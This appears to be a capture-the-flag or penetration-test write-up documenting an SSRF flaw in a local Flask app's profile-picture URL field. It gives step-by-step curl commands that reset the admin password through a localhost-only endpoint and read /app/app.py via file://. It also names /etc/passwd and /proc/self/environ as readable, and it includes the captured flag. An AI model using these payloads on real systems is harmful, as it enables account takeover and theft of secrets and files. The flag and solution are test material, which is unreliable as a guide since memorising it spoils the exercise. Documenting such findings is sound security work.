# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: Server-Side Request Forgery via Profile Picture URL

**Summary:**
- **Vulnerable location:** POST /profile endpoint, `profile_picture_url` parameter (app.py:93-100)
- **Impact:** Complete admin account takeover via localhost-only password reset endpoint bypass, flag capture, and arbitrary local file disclosure
- **Severity:** Critical

**Prerequisites:**
- Valid user account (can be self-registered at http://localhost:37053/register)
- Active authenticated session

**Exploitation Steps:**

**Step 1: Create test user account**
```bash
curl -X POST http://localhost:37053/register \
  -d "username=ssrf_tester" \
  -d "password=testpass123" \
  -d "first_name=SSRF" \
  -d "last_name=Tester" \
  -d "email=ssrf@test.com"
```
Expected Response: HTTP 302 redirect to /login with flash message "Registration successful! Please login."

**Step 2: Authenticate and obtain session cookie**
```bash
curl -X POST http://localhost:37053/login \
  -d "username=ssrf_tester" \
  -d "password=testpass123" \
  -c /tmp/ssrf_cookies.txt
```
Expected Response: HTTP 302 redirect to /profile with Set-Cookie header containing session token

**Step 3: Trigger SSRF to bypass IP-based access control and reset admin password**
```bash
curl -X POST http://localhost:37053/profile \
  -b /tmp/ssrf_cookies.txt \
  --data-urlencode "first_name=SSRF" \
  --data-urlencode "last_name=Tester" \
  --data-urlencode "email=ssrf@test.com" \
  --data-urlencode "profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=hacked123"
```

Expected Response: HTTP 200 OK with profile page showing the downloaded file

**Technical Details:**
- The application accepts the `profile_picture_url` parameter without any URL validation
- Line 97 of app.py: `urllib.request.urlretrieve(profile_picture_url, os.path.join(app.config['UPLOAD_FOLDER'], filename))`
- urllib makes a GET request to http://127.0.0.1/reset_password with query parameters
- The /reset_password endpoint (app.py:104-116) checks `request.remote_addr == '127.0.0.1'` (line 106)
- Since the request originates from the application server itself (localhost), the IP check passes
- Line 113 executes: `users['admin']['password'] = 'hacked123'`
- Response "Password reset successfully" is saved to /static/uploads/ and accessible

**Step 4: Verify password reset success**
```bash
curl http://localhost:37053/static/uploads/reset_passwordusernameadminnewpasswordhacked123
```
Expected Output: "Password reset successfully"

**Step 5: Authenticate as admin with new password**
```bash
curl -X POST http://localhost:37053/login \
  -d "username=admin" \
  -d "password=hacked123" \
  -c /tmp/admin_cookies.txt
```
Expected Response: HTTP 302 redirect to /profile with admin session cookie

**Step 6: Retrieve flag from admin profile**
```bash
curl http://localhost:37053/profile -b /tmp/admin_cookies.txt
```

**Proof of Impact:**

**Flag Captured:**
```
FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}
```

**Evidence of Successful Exploitation:**
1. Successfully created regular user account via self-registration
2. Authenticated as regular user (ssrf_tester)
3. Exploited SSRF vulnerability to make localhost request to /reset_password endpoint
4. Bypassed IP-based access control (127.0.0.1 restriction) via server-side request
5. Successfully reset admin password from "adminpass" to "hacked123"
6. Authenticated as admin user with new password
7. Retrieved flag from admin profile page (app.py:102 - flag only displayed when username == 'admin')

**Alternative Exploitation Path: Local File Disclosure via file:// Protocol**

The SSRF vulnerability also supports the file:// protocol, enabling arbitrary local file reads:

**Step 1: Trigger file:// SSRF to read application source**
```bash
curl -X POST http://localhost:37053/profile \
  -b /tmp/ssrf_cookies.txt \
  --data-urlencode "first_name=SSRF" \
  --data-urlencode "last_name=Tester" \
  --data-urlencode "email=ssrf@test.com" \
  --data-urlencode "profile_picture_url=file:///app/app.py"
```

**Step 2: Retrieve disclosed file**
```bash
curl http://localhost:37053/static/uploads/app.py
```

**Evidence of Local File Disclosure:**
Successfully retrieved application source code (app.py) which contains:
- Hardcoded session secret key: 'supersecretkey' (line 7)
- Default admin credentials: admin:adminpass (lines 13-14)
- FLAG constant embedded in source code: FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d} (line 22)
- Complete application logic revealing all vulnerabilities

**Additional Sensitive Files Accessible:**
- /etc/passwd (system user enumeration)
- /proc/self/environ (process environment variables)
- /app/requirements.txt (dependency disclosure)
- Any file readable by the Flask application process

**Notes:**

**SSRF Type:** Classic SSRF with partial response visibility (blind for external targets, semi-blind for internal targets)

**Missing Security Controls:**
1. No URL validation - accepts any protocol (http://, https://, file://, ftp://)
2. No hostname/IP allowlist - permits internal IPs (127.0.0.1, 192.168.x.x, 10.x.x.x)
3. No protocol allowlist - dangerous file:// protocol fully supported
4. No port restrictions - can target any port
5. No timeout configured - vulnerable to DoS via slow servers
6. No logging of attempted URLs - blind to security monitoring
7. Generic error handling - catch-all exception with no details (line 99-100)

**Root Cause:**
Complete absence of URL validation at app.py:93-97. User-controlled input (`profile_picture_url`) passed directly to `urllib.request.urlretrieve()` without any security checks.

**Network Boundary Bypass Demonstrated:**
- Successfully accessed localhost-only endpoint (/reset_password) from external network
- Bypassed IP-based access control (127.0.0.1 restriction) via server-side proxy
- Gained administrative privileges on the application
- Retrieved sensitive data intended only for admin users (flag)

**Exploitation Complexity:** Low - Requires only basic HTTP requests and understanding of SSRF principles. Total exploitation time: <5 minutes from account creation to flag capture.

**Reproducibility:** 100% - Exploit works reliably on every attempt as long as:
1. User registration is available (self-service registration enabled)
2. Application is running and accessible at http://localhost:37053
3. No WAF or network controls block localhost requests from the application server
